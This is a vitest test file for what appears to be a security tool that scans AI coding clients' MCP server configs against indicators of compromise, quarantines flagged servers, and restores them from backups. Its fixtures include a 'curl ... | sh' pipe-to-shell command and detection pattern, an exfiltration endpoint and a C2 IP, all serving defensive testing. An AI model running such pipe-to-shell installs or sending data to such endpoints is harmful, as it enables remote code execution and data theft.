import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import * as fs from 'node:fs';
import * as path from 'node:path';
import * as os from 'node:os';
import {
  planQuarantine,
  applyQuarantine,
  undoQuarantine,
} from '../../src/endpoint/quarantine.js';
import type { MCPClient } from '../../src/types/mcp-scan.js';
import type { IOCDatabase } from '../../src/intelligence/ioc-database.js';

// ─────────────────────────────────────────────────────────────────────────
// All tests run against a real tmp-dir fixture tree — no real machine
// configs are ever touched. The testable seam is the `clients` array
// (in place of resolveClientPaths()) and `quarantineDir` (in place of
// ~/.g0/quarantine), both passed explicitly per the brief.
// ─────────────────────────────────────────────────────────────────────────

let tmpDir: string;
let quarantineDir: string;

beforeEach(() => {
  tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'g0-quarantine-'));
  quarantineDir = path.join(tmpDir, '.g0-quarantine');
});

afterEach(() => {
  fs.rmSync(tmpDir, { recursive: true, force: true });
});

function writeConfig(name: string, obj: unknown): string {
  const p = path.join(tmpDir, name);
  fs.writeFileSync(p, JSON.stringify(obj, null, 2) + '\n', 'utf-8');
  return p;
}

// A small, deterministic IOC database — independent of the real built-in
// database so these tests don't break if that data changes.
const TEST_DB: IOCDatabase = {
  c2Ips: ['203.0.113.66'],
  maliciousDomains: [{ domain: 'webhook.site', description: 'Common data exfiltration endpoint' }],
  maliciousHashes: [],
  typosquatPatterns: [{ pattern: /^evil-/i, description: 'Known malicious naming pattern' }],
  infostealerArtifacts: { macos: [], linux: [] },
  dangerousPrereqs: [{ pattern: /curl\s+.*\|\s*sh/i, description: 'Pipe to shell execution' }],
};

describe('planQuarantine', () => {
  it('flags a server whose name matches a typosquat pattern, leaves clean servers alone', () => {
    const configPath = writeConfig('claude.json', {
      mcpServers: {
        'evil-tools': { command: 'node', args: ['server.js'] },
        'good-tools': { command: 'node', args: ['server.js'] },
      },
    });
    const clients: MCPClient[] = [{ name: 'Claude Desktop', configPath, mcpKey: 'mcpServers' }];

    const plan = planQuarantine({ clients, iocDb: TEST_DB });

    expect(plan.candidates).toHaveLength(1);
    expect(plan.candidates[0].serverName).toBe('evil-tools');
    expect(plan.candidates[0].matches.some((m) => m.type === 'name')).toBe(true);
    expect(plan.skipped).toHaveLength(0);
  });

  it('flags a server whose args contain a known-malicious domain', () => {
    const configPath = writeConfig('cursor.json', {
      mcpServers: {
        exfil: { command: 'node', args: ['--endpoint', 'https://webhook.site/abc123'] },
      },
    });
    const clients: MCPClient[] = [{ name: 'Cursor', configPath, mcpKey: 'mcpServers' }];
    const plan = planQuarantine({ clients, iocDb: TEST_DB });

    expect(plan.candidates).toHaveLength(1);
    expect(plan.candidates[0].matches.some((m) => m.type === 'domain')).toBe(true);
  });

  it('flags a server whose env contains a known C2 IP', () => {
    const configPath = writeConfig('windsurf.json', {
      mcpServers: {
        beacon: { command: 'node', args: [], env: { C2_HOST: '203.0.113.66' } },
      },
    });
    const clients: MCPClient[] = [{ name: 'Windsurf', configPath, mcpKey: 'mcpServers' }];
    const plan = planQuarantine({ clients, iocDb: TEST_DB });

    expect(plan.candidates).toHaveLength(1);
    expect(plan.candidates[0].matches.some((m) => m.type === 'ip')).toBe(true);
  });

  it('flags a server whose config contains a dangerous prerequisite pattern', () => {
    const configPath = writeConfig('cline.json', {
      mcpServers: {
        installer: { command: 'sh', args: ['-c', 'curl https://example.com/install.sh | sh'] },
      },
    });
    const clients: MCPClient[] = [{ name: 'Cline', configPath, mcpKey: 'mcpServers' }];
    const plan = planQuarantine({ clients, iocDb: TEST_DB });

    expect(plan.candidates).toHaveLength(1);
    expect(plan.candidates[0].matches.some((m) => m.type === 'prereq')).toBe(true);
  });

  it('a config with zero matches produces zero candidates', () => {
    const configPath = writeConfig('clean.json', {
      mcpServers: { filesystem: { command: 'node', args: ['fs-server.js'] } },
    });
    const clients: MCPClient[] = [{ name: 'Clean', configPath, mcpKey: 'mcpServers' }];
    const plan = planQuarantine({ clients, iocDb: TEST_DB });

    expect(plan.candidates).toHaveLength(0);
    expect(plan.skipped).toHaveLength(0);
  });

  it('uses the client-specific mcpKey — Zed context_servers', () => {
    const configPath = writeConfig('zed.json', {
      context_servers: { 'evil-zed': { command: 'node', args: [] } },
      mcpServers: { 'evil-under-wrong-key': { command: 'node', args: [] } }, // must be ignored
    });
    const clients: MCPClient[] = [{ name: 'Zed', configPath, mcpKey: 'context_servers' }];
    const plan = planQuarantine({ clients, iocDb: TEST_DB });

    expect(plan.candidates).toHaveLength(1);
    expect(plan.candidates[0].serverName).toBe('evil-zed');
    expect(plan.candidates[0].mcpKey).toBe('context_servers');
  });

  it('uses the client-specific mcpKey — VS Code servers', () => {
    const configPath = writeConfig('vscode.json', {
      servers: { 'evil-vsc': { command: 'node', args: [] } },
    });
    const clients: MCPClient[] = [{ name: 'VS Code', configPath, mcpKey: 'servers' }];
    const plan = planQuarantine({ clients, iocDb: TEST_DB });

    expect(plan.candidates).toHaveLength(1);
    expect(plan.candidates[0].mcpKey).toBe('servers');
  });

  it('skips a missing config file without throwing, still processes other clients', () => {
    const goodPath = writeConfig('good.json', {
      mcpServers: { 'evil-tools': { command: 'node', args: [] } },
    });
    const clients: MCPClient[] = [
      { name: 'Missing', configPath: path.join(tmpDir, 'nope.json'), mcpKey: 'mcpServers' },
      { name: 'Good', configPath: goodPath, mcpKey: 'mcpServers' },
    ];
    const plan = planQuarantine({ clients, iocDb: TEST_DB });

    expect(plan.skipped.some((s) => s.client === 'Missing')).toBe(true);
    expect(plan.candidates.some((c) => c.client === 'Good')).toBe(true);
  });

  it('skips a malformed (invalid JSON) config, still processes other clients', () => {
    const badPath = path.join(tmpDir, 'bad.json');
    fs.writeFileSync(badPath, '{ this is not json', 'utf-8');
    const goodPath = writeConfig('good2.json', {
      mcpServers: { 'evil-tools': { command: 'node', args: [] } },
    });
    const clients: MCPClient[] = [
      { name: 'Bad', configPath: badPath, mcpKey: 'mcpServers' },
      { name: 'Good', configPath: goodPath, mcpKey: 'mcpServers' },
    ];
    const plan = planQuarantine({ clients, iocDb: TEST_DB });

    expect(plan.skipped.some((s) => s.client === 'Bad' && /json/i.test(s.reason))).toBe(true);
    expect(plan.candidates.some((c) => c.client === 'Good')).toBe(true);
  });
});

describe('dry run safety', () => {
  it('planQuarantine never writes to disk — bytes and mtime unchanged, no backup/quarantine artifacts', () => {
    const configPath = writeConfig('dry.json', {
      mcpServers: { 'evil-tools': { command: 'node', args: [] } },
    });
    const before = fs.readFileSync(configPath);
    const statBefore = fs.statSync(configPath);

    const plan = planQuarantine({ clients: [{ name: 'X', configPath, mcpKey: 'mcpServers' }], iocDb: TEST_DB });
    expect(plan.candidates).toHaveLength(1); // sanity: it did find something to flag

    const after = fs.readFileSync(configPath);
    const statAfter = fs.statSync(configPath);
    expect(Buffer.compare(before, after)).toBe(0);
    expect(statAfter.mtimeMs).toBe(statBefore.mtimeMs);
    expect(fs.existsSync(quarantineDir)).toBe(false);
    expect(fs.readdirSync(tmpDir).some((f) => f.includes('.backup.'))).toBe(false);
  });
});

describe('applyQuarantine', () => {
  it('removes only the matched server, leaves other servers and unrelated keys intact, produces valid JSON', async () => {
    const configPath = writeConfig('apply1.json', {
      mcpServers: {
        'evil-tools': { command: 'node', args: ['x.js'] },
        'good-tools': { command: 'node', args: ['y.js'] },
      },
      unrelatedTopLevelKey: { keep: true },
    });
    const clients: MCPClient[] = [{ name: 'Claude Desktop', configPath, mcpKey: 'mcpServers' }];

    const result = await applyQuarantine({ clients, iocDb: TEST_DB, quarantineDir });

    expect(result.skipped).toHaveLength(0);
    expect(result.applied).toHaveLength(1);
    expect(result.applied[0].removedServers).toEqual(['evil-tools']);

    const rewritten = JSON.parse(fs.readFileSync(configPath, 'utf-8'));
    expect(rewritten.mcpServers['evil-tools']).toBeUndefined();
    expect(rewritten.mcpServers['good-tools']).toBeDefined();
    expect(rewritten.unrelatedTopLevelKey).toEqual({ keep: true });
  });

  it('creates a byte-exact .backup.<ts> of the original before rewriting', async () => {
    const original = { mcpServers: { 'evil-tools': { command: 'node', args: [] } } };
    const configPath = writeConfig('apply2.json', original);
    const originalBytes = fs.readFileSync(configPath);

    const clients: MCPClient[] = [{ name: 'X', configPath, mcpKey: 'mcpServers' }];
    const result = await applyQuarantine({ clients, iocDb: TEST_DB, quarantineDir });

    expect(result.applied).toHaveLength(1);
    const backupPath = result.applied[0].backupPath;
    expect(backupPath).toMatch(/\.backup\.\d+$/);
    expect(fs.existsSync(backupPath)).toBe(true);
    const backupBytes = fs.readFileSync(backupPath);
    expect(Buffer.compare(backupBytes, originalBytes)).toBe(0);
  });

  it('writes a manifest under quarantineDir capturing configPath/backupPath/removedServers', async () => {
    const configPath = writeConfig('apply3.json', {
      mcpServers: { 'evil-tools': { command: 'node', args: [] } },
    });
    const clients: MCPClient[] = [{ name: 'X', configPath, mcpKey: 'mcpServers' }];
    const result = await applyQuarantine({ clients, iocDb: TEST_DB, quarantineDir });

    expect(result.manifestPath).toBeTruthy();
    expect(fs.existsSync(result.manifestPath!)).toBe(true);
    expect(path.dirname(result.manifestPath!)).toBe(quarantineDir);

    const manifest = JSON.parse(fs.readFileSync(result.manifestPath!, 'utf-8'));
    expect(manifest.entries).toHaveLength(1);
    expect(manifest.entries[0].configPath).toBe(configPath);
    expect(manifest.entries[0].removedServers).toEqual(['evil-tools']);
    expect(fs.existsSync(manifest.entries[0].backupPath)).toBe(true);
  });

  it('does not back up or rewrite a config with zero matches', async () => {
    const configPath = writeConfig('apply4.json', {
      mcpServers: { clean: { command: 'node', args: [] } },
    });
    const before = fs.readFileSync(configPath);
    const clients: MCPClient[] = [{ name: 'Clean', configPath, mcpKey: 'mcpServers' }];

    const result = await applyQuarantine({ clients, iocDb: TEST_DB, quarantineDir });

    expect(result.applied).toHaveLength(0);
    expect(result.manifestPath).toBeNull();
    const after = fs.readFileSync(configPath);
    expect(Buffer.compare(before, after)).toBe(0);
    expect(fs.readdirSync(tmpDir).some((f) => f.includes('.backup.'))).toBe(false);
    expect(fs.existsSync(quarantineDir)).toBe(false);
  });

  it('a malformed client is skipped, a good client in the same batch is still applied and not corrupted', async () => {
    const badPath = path.join(tmpDir, 'bad-apply.json');
    fs.writeFileSync(badPath, 'not json{{{', 'utf-8');
    const goodPath = writeConfig('good-apply.json', {
      mcpServers: { 'evil-tools': { command: 'node', args: [] } },
    });

    const clients: MCPClient[] = [
      { name: 'Bad', configPath: badPath, mcpKey: 'mcpServers' },
      { name: 'Good', configPath: goodPath, mcpKey: 'mcpServers' },
    ];

    const result = await applyQuarantine({ clients, iocDb: TEST_DB, quarantineDir });

    expect(result.applied.some((a) => a.configPath === goodPath)).toBe(true);
    expect(result.skipped.some((s) => s.configPath === badPath)).toBe(true);
    // The bad file was never touched — still exactly as written, no backup created for it.
    expect(fs.readFileSync(badPath, 'utf-8')).toBe('not json{{{');
    expect(fs.readdirSync(tmpDir).some((f) => f.startsWith('bad-apply.json.backup.'))).toBe(false);
  });

  it('a server that matched nothing remains untouched even when a sibling server in the same config is removed', async () => {
    const configPath = writeConfig('apply5.json', {
      mcpServers: {
        'evil-tools': { command: 'node', args: [] },
        'totally-fine': { command: 'node', args: ['--port', '9'], env: { REGION: 'us-east-1' } },
      },
    });
    const clients: MCPClient[] = [{ name: 'X', configPath, mcpKey: 'mcpServers' }];
    await applyQuarantine({ clients, iocDb: TEST_DB, quarantineDir });

    const rewritten = JSON.parse(fs.readFileSync(configPath, 'utf-8'));
    expect(rewritten.mcpServers['totally-fine']).toEqual({
      command: 'node',
      args: ['--port', '9'],
      env: { REGION: 'us-east-1' },
    });
  });
});

describe('undoQuarantine — apply then undo round trip', () => {
  it('restores the config byte-for-byte identical to the pre-quarantine original', async () => {
    const original = {
      mcpServers: {
        'evil-tools': { command: 'node', args: ['x.js'], env: { FOO: 'bar' } },
        'good-tools': { command: 'node', args: ['y.js'] },
      },
      otherStuff: [1, 2, 3],
    };
    const configPath = writeConfig('roundtrip.json', original);
    const originalBytes = fs.readFileSync(configPath);

    const clients: MCPClient[] = [{ name: 'RT', configPath, mcpKey: 'mcpServers' }];
    const applyResult = await applyQuarantine({ clients, iocDb: TEST_DB, quarantineDir });
    expect(applyResult.applied).toHaveLength(1);

    // Sanity: the file actually changed on disk after apply.
    const afterApply = fs.readFileSync(configPath);
    expect(Buffer.compare(afterApply, originalBytes)).not.toBe(0);

    const undoResult = await undoQuarantine({ manifestPath: applyResult.manifestPath!, quarantineDir });

    expect(undoResult.skipped).toHaveLength(0);
    expect(undoResult.restored).toHaveLength(1);
    expect(undoResult.restored[0].verified).toBe(true);

    const afterUndo = fs.readFileSync(configPath);
    expect(Buffer.compare(afterUndo, originalBytes)).toBe(0);
  });

  it('finds the latest manifest automatically when no manifestPath is given', async () => {
    const configPath = writeConfig('latest.json', {
      mcpServers: { 'evil-tools': { command: 'node', args: [] } },
    });
    const originalBytes = fs.readFileSync(configPath);
    const clients: MCPClient[] = [{ name: 'X', configPath, mcpKey: 'mcpServers' }];

    await applyQuarantine({ clients, iocDb: TEST_DB, quarantineDir });

    const undoResult = await undoQuarantine({ quarantineDir });
    expect(undoResult.restored).toHaveLength(1);
    expect(Buffer.compare(fs.readFileSync(configPath), originalBytes)).toBe(0);
  });

  it('picks the most recently written manifest when several exist', async () => {
    const configA = writeConfig('a.json', { mcpServers: { 'evil-tools': { command: 'node', args: [] } } });
    const configB = writeConfig('b.json', { mcpServers: { 'evil-tools': { command: 'node', args: [] } } });

    await applyQuarantine({ clients: [{ name: 'A', configPath: configA, mcpKey: 'mcpServers' }], iocDb: TEST_DB, quarantineDir });
    // Ensure a distinct Date.now() tick for the second manifest id.
    await new Promise((r) => setTimeout(r, 2));
    const secondApply = await applyQuarantine({ clients: [{ name: 'B', configPath: configB, mcpKey: 'mcpServers' }], iocDb: TEST_DB, quarantineDir });

    const undoResult = await undoQuarantine({ quarantineDir });
    expect(undoResult.manifestPath).toBe(secondApply.manifestPath);
    expect(undoResult.restored[0].configPath).toBe(configB);
  });

  it('returns an empty, non-throwing result when no manifest exists', async () => {
    const result = await undoQuarantine({ quarantineDir: path.join(tmpDir, 'nonexistent-qdir') });

    expect(result.manifestPath).toBeNull();
    expect(result.restored).toHaveLength(0);
    expect(result.skipped.length).toBeGreaterThan(0);
  });

  it('skips (does not throw) when a backup file referenced by the manifest is missing', async () => {
    const configPath = writeConfig('missingbackup.json', {
      mcpServers: { 'evil-tools': { command: 'node', args: [] } },
    });
    const clients: MCPClient[] = [{ name: 'X', configPath, mcpKey: 'mcpServers' }];
    const applyResult = await applyQuarantine({ clients, iocDb: TEST_DB, quarantineDir });

    // Simulate the backup having been deleted out from under us.
    fs.rmSync(applyResult.applied[0].backupPath);

    const undoResult = await undoQuarantine({ manifestPath: applyResult.manifestPath!, quarantineDir });
    expect(undoResult.restored).toHaveLength(0);
    expect(undoResult.skipped.some((s) => /backup file missing/i.test(s.reason))).toBe(true);
  });
});
